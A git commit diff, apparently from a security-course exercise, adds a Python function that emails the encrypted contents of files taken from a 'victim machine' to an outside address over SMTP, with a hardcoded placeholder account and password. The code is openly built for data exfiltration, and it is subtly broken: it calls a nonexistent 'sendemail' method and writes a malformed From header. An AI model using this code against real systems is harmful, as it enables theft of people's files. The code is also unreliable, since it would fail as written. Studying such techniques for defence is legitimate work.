cfe23e14dc15ab1431230b4abb869bd27c73a76a
AnLau25 <avald024@uottawa.ca>
2025-06-28 14:24:55 -0400

    plain_email(subject, contents)

--- ch9_FunWithExfiltration/email_exfil.py
+++ ch9_FunWithExfiltration/email_exfil.py
@@ -10,4 +10,20 @@ smtp_acct = 'an@example.com'
 smtp_password = 'seKret'
 tgt_accts = ['an@elsewhere.com']
 
+def plain_email(subject, contents):
+    message = f'Subject: {subject}\nFrom {smtp_acct}\n'
+    message += f'To: {tgt_accts}\n\n{contents.decode()}'
+    # Takes subject message as input; the subject = name of contents file in victim machine
+    # The 𝘤𝘰𝘯𝘵𝘦𝘯𝘵𝘴 are the encrypted string from 𝘦𝘯𝘤𝘳𝘺𝘱𝘵
+    server = smtplib.SMTP(smtp_server, smtp_port)
+    server.starttls()
+    server.login(smtp_acct, smtp_password)
+    # Connect to server and log in
+    
+    # server.set_debuglevel(1) # to see if there are connection errors
+    server.sendemail(smtp_acct, tgt_accts, message)
+    # Invoque sendmail, and send
+    time.sleep(1)
+    server.quit()
+
 
